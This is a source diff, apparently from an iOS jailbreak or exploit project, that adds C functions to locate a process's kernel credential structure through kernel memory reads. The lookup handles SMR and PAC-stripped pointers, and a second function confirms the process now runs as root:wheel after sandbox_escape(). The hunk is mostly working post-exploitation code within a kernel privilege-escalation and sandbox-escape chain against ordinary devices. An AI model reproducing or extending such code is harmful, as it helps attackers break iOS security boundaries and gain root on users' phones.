@@ -215,6 +215,70 @@ static int set_root_credentials(uint64_t ucred) {
 
 #pragma mark - Main entry
 
+// L5.1 (hub): locate the current proc's ucred via the same proc_ro walk
+// sandbox_escape() uses. Read-only. Returns 0 (or TWEAK_ERR_*) with the
+// ucred pointer via out param.
+static uint64_t find_ucred_in_proc_ro(uint64_t proc_ro) {
+    // Scan proc_ro for ucred — offset varies by iOS build.
+    // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
+    uint64_t ucred = 0;
+    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+        uint64_t raw = early_kread64(proc_ro + off);
+        uint64_t smr = kread_smrptr(proc_ro + off);
+        uint64_t pac = S(raw);
+
+        // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
+        if (ptr_in_kernel_mapped(smr, proc_ro)) {
+            uint64_t maybe_label = S(early_kread64(smr + 0x78));
+            if (ptr_in_kernel_mapped(maybe_label, smr)) {
+                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
+                if (ptr_in_kernel_mapped(maybe_sandbox, maybe_label)) {
+                    TweakLog("[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
+                    ucred = smr;
+                    break;
+                }
+            }
+        }
+        // Also try PAC-stripped
+        if (!ucred && ptr_in_kernel_mapped(pac, proc_ro)) {
+            uint64_t maybe_label = S(early_kread64(pac + 0x78));
+            if (ptr_in_kernel_mapped(maybe_label, pac)) {
+                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
+                if (ptr_in_kernel_mapped(maybe_sandbox, maybe_label)) {
+                    TweakLog("[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
+                    ucred = pac;
+                    break;
+                }
+            }
+        }
+    }
+    return ucred;
+}
+
+// L5.1 (hub app): post-escape credential read-back. After sandbox_escape()
+// succeeded, the app calls this to confirm the kernel-side ucred now reads
+// root:wheel (the same verification set_root_credentials performs
+// internally). Returns 0 on success with uid/gid/groups[0] filled.
+int sandbox_escape_read_posix_creds(uint64_t self_proc,
+                                    uint32_t *uid, uint32_t *gid, uint32_t *groups0) {
+    if (!exploit_is_done()) { TweakLog("[SBX] creds read-back: exploit not done"); return TWEAK_ERR_EXPLOIT_FAILED; }
+    if (!self_proc || !uid || !gid || !groups0) { TweakLog("[SBX] creds read-back: bad args"); return TWEAK_ERR_INVALID_ARG; }
+
+    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
+    uint64_t proc_ro = S(proc_ro_raw);
+    if (!K(proc_ro)) { TweakLog("[SBX] creds read-back: proc_ro invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+
+    uint64_t ucred = find_ucred_in_proc_ro(proc_ro);
+    if (!K(ucred)) { TweakLog("[SBX] creds read-back: ucred not found"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+
+    uint64_t posix = ucred + OFF_UCRED_CR_POSIX;
+    *uid = kread32(posix + OFF_POSIX_CR_UID);
+    *gid = kread32(posix + OFF_POSIX_CR_GID);
+    *groups0 = kread32(posix + OFF_POSIX_CR_GROUPS0);
+    TweakLog("[SBX] creds read-back: uid=%u gid=%u groups[0]=%u", *uid, *gid, *groups0);
+    return 0;
+}
+
 int sandbox_escape(uint64_t self_proc) {
     if (!exploit_is_done()) { TweakLog("[SBX] Exploit not done, cannot escape sandbox"); return TWEAK_ERR_EXPLOIT_FAILED; }
     if (!self_proc) { TweakLog("[SBX] self_proc is NULL"); return TWEAK_ERR_INVALID_ARG; }
